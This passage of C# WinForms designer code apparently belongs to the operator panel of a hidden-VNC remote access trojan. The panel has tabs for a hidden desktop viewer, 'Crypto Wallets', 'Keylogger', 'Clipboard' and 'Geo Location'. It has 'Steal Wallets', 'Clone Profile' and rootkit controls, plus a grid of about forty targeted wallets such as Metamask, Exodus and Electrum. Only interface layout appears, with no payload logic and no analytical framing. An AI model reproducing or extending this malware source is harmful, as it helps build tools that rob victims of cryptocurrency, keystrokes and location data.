            this.label16.Text = "Sollet";
            this.label17.AutoSize = true;
            this.label17.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label17.Location = new System.Drawing.Point(262, 460);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(56, 12);
            this.label17.TabIndex = 123;
            this.label17.Text = "Metamask";
            this.label13.AutoSize = true;
            this.label13.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label13.Location = new System.Drawing.Point(958, 271);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(31, 12);
            this.label13.TabIndex = 115;
            this.label13.Text = "Keplr";
            this.label14.AutoSize = true;
            this.label14.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label14.Location = new System.Drawing.Point(111, 398);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(37, 12);
            this.label14.TabIndex = 117;
            this.label14.Text = "Swash";
            this.label15.AutoSize = true;
            this.label15.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label15.Location = new System.Drawing.Point(622, 398);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(46, 12);
            this.label15.TabIndex = 119;
            this.label15.Text = "Starcoin";
            this.label10.AutoSize = true;
            this.label10.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label10.Location = new System.Drawing.Point(795, 61);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(44, 12);
            this.label10.TabIndex = 109;
            this.label10.Text = "Coinomi";
            this.label11.AutoSize = true;
            this.label11.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label11.Location = new System.Drawing.Point(111, 271);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(49, 12);
            this.label11.TabIndex = 111;
            this.label11.Text = "Liquality";
            this.label12.AutoSize = true;
            this.label12.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label12.Location = new System.Drawing.Point(111, 460);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(31, 12);
            this.label12.TabIndex = 113;
            this.label12.Text = "Nifty";
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label9.Location = new System.Drawing.Point(958, 334);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(46, 12);
            this.label9.TabIndex = 107;
            this.label9.Text = "Crocobit";
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label5.Location = new System.Drawing.Point(260, 61);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(28, 12);
            this.label5.TabIndex = 99;
            this.label5.Text = "Jaxx";
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label6.Location = new System.Drawing.Point(449, 61);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(40, 12);
            this.label6.TabIndex = 101;
            this.label6.Text = "Exodus";
            this.label8.AutoSize = true;
            this.label8.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label8.Location = new System.Drawing.Point(958, 398);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(43, 12);
            this.label8.TabIndex = 105;
            this.label8.Text = "Oxygen";
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label7.Location = new System.Drawing.Point(620, 120);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(40, 12);
            this.label7.TabIndex = 103;
            this.label7.Text = "Guarda";
            this.label46.AutoSize = true;
            this.label46.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label46.Location = new System.Drawing.Point(109, 176);
            this.label46.Name = "label46";
            this.label46.Size = new System.Drawing.Size(29, 12);
            this.label46.TabIndex = 279;
            this.label46.Text = "Dash";
            this.label48.AutoSize = true;
            this.label48.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label48.Location = new System.Drawing.Point(109, 120);
            this.label48.Name = "label48";
            this.label48.Size = new System.Drawing.Size(49, 12);
            this.label48.TabIndex = 277;
            this.label48.Text = "Electrum";
            this.label37.AutoSize = true;
            this.label37.Font = new System.Drawing.Font("Verdana", 6.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label37.Location = new System.Drawing.Point(109, 61);
            this.label37.Name = "label37";
            this.label37.Size = new System.Drawing.Size(33, 12);
            this.label37.TabIndex = 211;
            this.label37.Text = "Zcash";
            this.txtKeyl.BackColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.txtKeyl.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.txtKeyl.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txtKeyl.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.txtKeyl.Location = new System.Drawing.Point(0, 0);
            this.txtKeyl.Name = "txtKeyl";
            this.txtKeyl.Size = new System.Drawing.Size(1135, 735);
            this.txtKeyl.TabIndex = 91;
            this.txtKeyl.Text = "";
            this.txtKeyl.TextChanged += new System.EventHandler(txtKeyl_TextChanged);
            this.txtClip.BackColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.txtClip.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.txtClip.Dock = System.Windows.Forms.DockStyle.Fill;
            this.txtClip.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.txtClip.Location = new System.Drawing.Point(0, 0);
            this.txtClip.Name = "txtClip";
            this.txtClip.Size = new System.Drawing.Size(1135, 735);
            this.txtClip.TabIndex = 90;
            this.txtClip.Text = "";
            this.txtClip.TextChanged += new System.EventHandler(txtClip_TextChanged);
            this.studioButton13.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.studioButton13.Location = new System.Drawing.Point(1008, 12);
            this.studioButton13.Name = "studioButton13";
            this.studioButton13.Size = new System.Drawing.Size(115, 23);
            this.studioButton13.TabIndex = 76;
            this.studioButton13.Text = "Get Location";
            this.studioButton13.UseVisualStyleBackColor = true;
            this.studioButton13.Click += new System.EventHandler(studioButton13_Click);
            this.label31.AutoSize = true;
            this.label31.Location = new System.Drawing.Point(186, 17);
            this.label31.Name = "label31";
            this.label31.Size = new System.Drawing.Size(53, 13);
            this.label31.TabIndex = 16;
            this.label31.Text = "longitude:";
            this.label25.AutoSize = true;
            this.label25.Location = new System.Drawing.Point(8, 17);
            this.label25.Name = "label25";
            this.label25.Size = new System.Drawing.Size(44, 13);
            this.label25.TabIndex = 15;
            this.label25.Text = "latitude:";
            this.txtlongitude.Location = new System.Drawing.Point(256, 13);
            this.txtlongitude.Name = "txtlongitude";
            this.txtlongitude.Size = new System.Drawing.Size(100, 20);
            this.txtlongitude.TabIndex = 14;
            this.txtlatitude.Location = new System.Drawing.Point(69, 13);
            this.txtlatitude.Name = "txtlatitude";
            this.txtlatitude.Size = new System.Drawing.Size(100, 20);
            this.txtlatitude.TabIndex = 13;
            this.map.BackColor = System.Drawing.Color.DimGray;
            this.map.Bearing = 0f;
            this.map.CanDragMap = true;
            this.map.ContextMenuStrip = this.contextMenuStrip1;
            this.map.Dock = System.Windows.Forms.DockStyle.Fill;
            this.map.EmptyTileColor = System.Drawing.Color.Navy;
            this.map.GrayScaleMode = false;
            this.map.HelperLineOption = GMap.NET.WindowsForms.HelperLineOptions.DontShow;
            this.map.LevelsKeepInMemory = 5;
            this.map.Location = new System.Drawing.Point(0, 44);
            this.map.MarkersEnabled = true;
            this.map.MaxZoom = 16;
            this.map.MinZoom = 0;
            this.map.MouseWheelZoomEnabled = true;
            this.map.MouseWheelZoomType = GMap.NET.MouseWheelZoomType.MousePositionAndCenter;
            this.map.Name = "map";
            this.map.NegativeMode = false;
            this.map.PolygonsEnabled = true;
            this.map.RetryLoadTile = 0;
            this.map.RoutesEnabled = true;
            this.map.ScaleMode = GMap.NET.WindowsForms.ScaleModes.Integer;
            this.map.SelectedAreaFillColor = System.Drawing.Color.FromArgb(33, 65, 105, 225);
            this.map.ShowTileGridLines = false;
            this.map.Size = new System.Drawing.Size(1135, 691);
            this.map.TabIndex = 12;
            this.map.Zoom = 5.0;
            this.panel3.Controls.Add(this.studioButton13);
            this.panel3.Controls.Add(this.label31);
            this.panel3.Controls.Add(this.txtlatitude);
            this.panel3.Controls.Add(this.label25);
            this.panel3.Controls.Add(this.txtlongitude);
            this.panel3.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel3.Location = new System.Drawing.Point(0, 0);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(1135, 44);
            this.panel3.TabIndex = 77;
            this.panel1.Controls.Add(this.studioButton14);
            this.panel1.Controls.Add(this.chkWallets);
            this.panel1.Controls.Add(this.label3);
            this.panel1.Controls.Add(this.label18);
            this.panel1.Controls.Add(this.chkInfo);
            this.panel1.Controls.Add(this.MinBtn);
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.ResizeLabel);
            this.panel1.Controls.Add(this.chkKeylog);
            this.panel1.Controls.Add(this.ResizeScroll);
            this.panel1.Controls.Add(this.label4);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.chkClip);
            this.panel1.Controls.Add(this.studioButton7);
            this.panel1.Controls.Add(this.studioButton9);
            this.panel1.Controls.Add(this.studioButton11);
            this.panel1.Controls.Add(this.CloseBtn);
            this.panel1.Controls.Add(this.studioButton10);
            this.panel1.Controls.Add(this.RestoreMaxBtn);
            this.panel1.Controls.Add(this.studioButton8);
            this.panel1.Controls.Add(this.studioButton1);
            this.panel1.Controls.Add(this.studioButton6);
            this.panel1.Controls.Add(this.chkClone);
            this.panel1.Controls.Add(this.btnWatcher);
            this.panel1.Controls.Add(this.btnElectrum);
            this.panel1.Controls.Add(this.btnRootkit);
            this.panel1.Controls.Add(this.btnKeyl);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.panel1.Location = new System.Drawing.Point(1143, 0);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(111, 763);
            this.panel1.TabIndex = 109;
            this.label3.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Location = new System.Drawing.Point(18, 474);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(69, 13);
            this.label3.TabIndex = 100;
            this.label3.Text = "Steal Wallets";
            this.label3.Visible = false;
            this.label18.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label18.AutoSize = true;
            this.label18.BackColor = System.Drawing.Color.Transparent;
            this.label18.Location = new System.Drawing.Point(22, 531);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(59, 13);
            this.label18.TabIndex = 99;
            this.label18.Text = "Information";
            this.MinBtn.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.MinBtn.BackgroundImage = HVNC.Properties.Resources.minimize_window;
            this.MinBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.MinBtn.Location = new System.Drawing.Point(16, 11);
            this.MinBtn.Name = "MinBtn";
            this.MinBtn.Size = new System.Drawing.Size(26, 26);
            this.MinBtn.TabIndex = 13;
            this.MinBtn.UseVisualStyleBackColor = true;
            this.MinBtn.Click += new System.EventHandler(MinBtn_Click);
            this.label2.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.Transparent;
            this.label2.Location = new System.Drawing.Point(24, 572);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(54, 13);
            this.label2.TabIndex = 94;
            this.label2.Text = "Keylogger";
            this.ResizeLabel.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.ResizeLabel.AutoSize = true;
            this.ResizeLabel.Location = new System.Drawing.Point(15, 744);
            this.ResizeLabel.Name = "ResizeLabel";
            this.ResizeLabel.Size = new System.Drawing.Size(74, 13);
            this.ResizeLabel.TabIndex = 4;
            this.ResizeLabel.Text = "Resize : 100%";
            this.ResizeScroll.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.ResizeScroll.AutoSize = false;
            this.ResizeScroll.Location = new System.Drawing.Point(6, 726);
            this.ResizeScroll.Maximum = 100;
            this.ResizeScroll.Minimum = 10;
            this.ResizeScroll.Name = "ResizeScroll";
            this.ResizeScroll.Size = new System.Drawing.Size(98, 19);
            this.ResizeScroll.TabIndex = 10;
            this.ResizeScroll.TickStyle = System.Windows.Forms.TickStyle.None;
            this.ResizeScroll.Value = 100;
            this.ResizeScroll.Scroll += new System.EventHandler(ResizeScroll_Scroll);
            this.label4.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.Transparent;
            this.label4.Location = new System.Drawing.Point(26, 613);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(52, 13);
            this.label4.TabIndex = 97;
            this.label4.Text = "ClipBoard";
            this.label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom;
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Location = new System.Drawing.Point(18, 679);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(66, 13);
            this.label1.TabIndex = 66;
            this.label1.Text = "Clone Profile";
            this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.CloseBtn.BackgroundImage = HVNC.Properties.Resources.close_window;
            this.CloseBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.CloseBtn.Location = new System.Drawing.Point(68, 11);
            this.CloseBtn.Name = "CloseBtn";
            this.CloseBtn.Size = new System.Drawing.Size(26, 26);
            this.CloseBtn.TabIndex = 11;
            this.CloseBtn.UseVisualStyleBackColor = true;
            this.CloseBtn.Click += new System.EventHandler(CloseBtn_Click);
            this.RestoreMaxBtn.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.RestoreMaxBtn.BackgroundImage = HVNC.Properties.Resources.maximize_window;
            this.RestoreMaxBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.RestoreMaxBtn.Location = new System.Drawing.Point(42, 11);
            this.RestoreMaxBtn.Name = "RestoreMaxBtn";
            this.RestoreMaxBtn.Size = new System.Drawing.Size(26, 26);
            this.RestoreMaxBtn.TabIndex = 12;
            this.RestoreMaxBtn.UseVisualStyleBackColor = true;
            this.RestoreMaxBtn.Click += new System.EventHandler(RestoreMaxBtn_Click);
            this.txtScreen.AutoSize = true;
            this.txtScreen.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.txtScreen.Location = new System.Drawing.Point(593, 730);
            this.txtScreen.Name = "txtScreen";
            this.txtScreen.Size = new System.Drawing.Size(56, 13);
            this.txtScreen.TabIndex = 112;
            this.txtScreen.Text = "SCREEN";
            this.txtScreen.Visible = false;
            this.tabControl1.Controls.Add(this.tabPage6);
            this.tabControl1.Controls.Add(this.tabPage7);
            this.tabControl1.Controls.Add(this.tabPage8);
            this.tabControl1.Controls.Add(this.tabPage9);
            this.tabControl1.Controls.Add(this.tabPage10);
            this.tabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.tabControl1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.tabControl1.Location = new System.Drawing.Point(0, 0);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(1143, 763);
            this.tabControl1.TabIndex = 110;
            this.tabPage6.Controls.Add(this.VNCBox);
            this.tabPage6.Controls.Add(this.groupBox6);
            this.tabPage6.Controls.Add(this.panel4);
            this.tabPage6.Location = new System.Drawing.Point(4, 24);
            this.tabPage6.Name = "tabPage6";
            this.tabPage6.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage6.Size = new System.Drawing.Size(1135, 735);
            this.tabPage6.TabIndex = 0;
            this.tabPage6.Text = "hVNC Viewer";
            this.tabPage6.UseVisualStyleBackColor = true;
            this.tabPage7.BackColor = System.Drawing.Color.White;
            this.tabPage7.Controls.Add(this.txtZilpay);
            this.tabPage7.Controls.Add(this.txtRonin);
            this.tabPage7.Controls.Add(this.label37);
            this.tabPage7.Controls.Add(this.txtExodusE);
            this.tabPage7.Controls.Add(this.label48);
            this.tabPage7.Controls.Add(this.txtYoroi);
            this.tabPage7.Controls.Add(this.label46);
            this.tabPage7.Controls.Add(this.label7);
            this.tabPage7.Controls.Add(this.label8);
            this.tabPage7.Controls.Add(this.label6);
            this.tabPage7.Controls.Add(this.label5);
            this.tabPage7.Controls.Add(this.label57);
            this.tabPage7.Controls.Add(this.label9);
            this.tabPage7.Controls.Add(this.label59);
            this.tabPage7.Controls.Add(this.label12);
            this.tabPage7.Controls.Add(this.label60);
            this.tabPage7.Controls.Add(this.label11);
            this.tabPage7.Controls.Add(this.label61);
            this.tabPage7.Controls.Add(this.label10);
            this.tabPage7.Controls.Add(this.txtMetamaskE);
            this.tabPage7.Controls.Add(this.label15);
            this.tabPage7.Controls.Add(this.txtRabet);
            this.tabPage7.Controls.Add(this.label14);
            this.tabPage7.Controls.Add(this.txtMTVS);
            this.tabPage7.Controls.Add(this.label13);
            this.tabPage7.Controls.Add(this.txtMathE);
            this.tabPage7.Controls.Add(this.label17);
            this.tabPage7.Controls.Add(this.txtAuvitas);
            this.tabPage7.Controls.Add(this.label16);
            this.tabPage7.Controls.Add(this.label21);
            this.tabPage7.Controls.Add(this.label20);
            this.tabPage7.Controls.Add(this.label19);
            this.tabPage7.Controls.Add(this.label22);
            this.tabPage7.Controls.Add(this.label28);
            this.tabPage7.Controls.Add(this.label52);
            this.tabPage7.Controls.Add(this.label27);
            this.tabPage7.Controls.Add(this.txtMTV);
            this.tabPage7.Controls.Add(this.label26);
            this.tabPage7.Controls.Add(this.label54);
            this.tabPage7.Controls.Add(this.label24);
            this.tabPage7.Controls.Add(this.label55);
            this.tabPage7.Controls.Add(this.label23);
            this.tabPage7.Controls.Add(this.label56);
            this.tabPage7.Controls.Add(this.label34);
            this.tabPage7.Controls.Add(this.label33);
            this.tabPage7.Controls.Add(this.label32);
            this.tabPage7.Controls.Add(this.label29);
            this.tabPage7.Controls.Add(this.label30);
            this.tabPage7.Controls.Add(this.label36);
            this.tabPage7.Controls.Add(this.txtETH);
            this.tabPage7.Controls.Add(this.txtBitcoin);
            this.tabPage7.Controls.Add(this.txtDash);
            this.tabPage7.Controls.Add(this.txtLitecoin);
            this.tabPage7.Controls.Add(this.txtAtom);
            this.tabPage7.Controls.Add(this.txtElec);
            this.tabPage7.Controls.Add(this.label44);
            this.tabPage7.Controls.Add(this.label45);
            this.tabPage7.Controls.Add(this.label47);
            this.tabPage7.Controls.Add(this.label49);
            this.tabPage7.Controls.Add(this.txtBitapp);
            this.tabPage7.Controls.Add(this.txtCoin98);
            this.tabPage7.Controls.Add(this.txtEqual);
            this.tabPage7.Controls.Add(this.txtMetamask);
            this.tabPage7.Controls.Add(this.txtJaxx);
            this.tabPage7.Controls.Add(this.txtKeplr);
            this.tabPage7.Controls.Add(this.txtCrocobit);
            this.tabPage7.Controls.Add(this.txtOxygen);
            this.tabPage7.Controls.Add(this.label35);
            this.tabPage7.Controls.Add(this.txtGuarda);
            this.tabPage7.Controls.Add(this.txtBytecoin);
            this.tabPage7.Controls.Add(this.txtMobox);
            this.tabPage7.Controls.Add(this.txtGuild);
            this.tabPage7.Controls.Add(this.txtIconex);
            this.tabPage7.Controls.Add(this.txtTon);
            this.tabPage7.Controls.Add(this.txtCoinomi);
            this.tabPage7.Controls.Add(this.txtzcash);
            this.tabPage7.Controls.Add(this.txtSollet);
            this.tabPage7.Controls.Add(this.txtNifty);
            this.tabPage7.Controls.Add(this.txtSlope);
            this.tabPage7.Controls.Add(this.txtSwash);
            this.tabPage7.Controls.Add(this.txtStarcoin);
            this.tabPage7.Controls.Add(this.txtTron);
            this.tabPage7.Controls.Add(this.txtPhantom);
            this.tabPage7.Controls.Add(this.txtLiquality);
            this.tabPage7.Controls.Add(this.txtArmory);
            this.tabPage7.Controls.Add(this.txtExodus);
            this.tabPage7.Controls.Add(this.txtFinnie);
            this.tabPage7.Controls.Add(this.txtMath);
            this.tabPage7.Controls.Add(this.txtBinance);
            this.tabPage7.Controls.Add(this.txtXinPay);
            this.tabPage7.Controls.Add(this.groupBox1);
            this.tabPage7.Controls.Add(this.groupBox2);
            this.tabPage7.Controls.Add(this.groupBox3);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox42);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox43);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox44);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox46);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox37);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox38);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox39);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox40);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox41);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox1);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox2);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox3);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox4);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox5);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox7);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox6);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox8);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox11);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox32);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox10);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox33);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox9);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox34);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox12);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox35);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox13);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox36);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox14);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox15);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox16);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox17);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox18);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox19);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox20);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox21);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox22);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox23);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox24);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox25);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox26);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox27);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox28);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox29);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox30);
            this.tabPage7.Controls.Add(this.rjCircularPictureBox31);
            this.tabPage7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.tabPage7.Location = new System.Drawing.Point(4, 24);
            this.tabPage7.Name = "tabPage7";
            this.tabPage7.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage7.Size = new System.Drawing.Size(1135, 735);
            this.tabPage7.TabIndex = 1;
            this.tabPage7.Text = "Crypto Wallets";
            this.groupBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.groupBox1.Location = new System.Drawing.Point(36, 17);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(1017, 205);
            this.groupBox1.TabIndex = 330;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Software Wallets";
            this.groupBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.groupBox2.Location = new System.Drawing.Point(36, 228);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(1017, 284);
            this.groupBox2.TabIndex = 331;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Chrome Wallets";
            this.groupBox3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.groupBox3.Location = new System.Drawing.Point(36, 518);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(1017, 143);
            this.groupBox3.TabIndex = 332;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Edge Wallets";
            this.tabPage8.BackColor = System.Drawing.Color.White;
            this.tabPage8.Controls.Add(this.txtKeyl);
            this.tabPage8.Location = new System.Drawing.Point(4, 24);
            this.tabPage8.Name = "tabPage8";
            this.tabPage8.Size = new System.Drawing.Size(1135, 735);
            this.tabPage8.TabIndex = 2;
            this.tabPage8.Text = "Keylogger";
            this.tabPage9.BackColor = System.Drawing.Color.White;
            this.tabPage9.Controls.Add(this.txtClip);
            this.tabPage9.Location = new System.Drawing.Point(4, 24);
            this.tabPage9.Name = "tabPage9";
            this.tabPage9.Size = new System.Drawing.Size(1135, 735);
            this.tabPage9.TabIndex = 3;
            this.tabPage9.Text = "Clipboard";
            this.tabPage10.BackColor = System.Drawing.Color.White;
            this.tabPage10.Controls.Add(this.map);
            this.tabPage10.Controls.Add(this.panel3);
            this.tabPage10.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.tabPage10.Location = new System.Drawing.Point(4, 24);
            this.tabPage10.Name = "tabPage10";
            this.tabPage10.Size = new System.Drawing.Size(1135, 735);
            this.tabPage10.TabIndex = 4;
            this.tabPage10.Text = "Geo Location";
            this.rjCircularPictureBox42.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox42.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox42.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox42.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox42.BorderSize = 2;
            this.rjCircularPictureBox42.GradientAngle = 50f;
            this.rjCircularPictureBox42.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox42.Image");
            this.rjCircularPictureBox42.Location = new System.Drawing.Point(913, 544);
            this.rjCircularPictureBox42.Name = "rjCircularPictureBox42";
            this.rjCircularPictureBox42.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox42.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox42.TabIndex = 324;
            this.rjCircularPictureBox42.TabStop = false;
            this.rjCircularPictureBox43.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox43.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
            this.rjCircularPictureBox43.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox43.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox43.BorderSize = 2;
            this.rjCircularPictureBox43.GradientAngle = 50f;
            this.rjCircularPictureBox43.Image = (System.Drawing.Image)resources.GetObject("rjCircularPictureBox43.Image");
            this.rjCircularPictureBox43.Location = new System.Drawing.Point(208, 607);
            this.rjCircularPictureBox43.Name = "rjCircularPictureBox43";
            this.rjCircularPictureBox43.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox43.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.rjCircularPictureBox43.TabIndex = 323;
            this.rjCircularPictureBox43.TabStop = false;
            this.rjCircularPictureBox44.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox44.BorderColor = System.Drawing.Color.FromArgb(53, 73, 103);
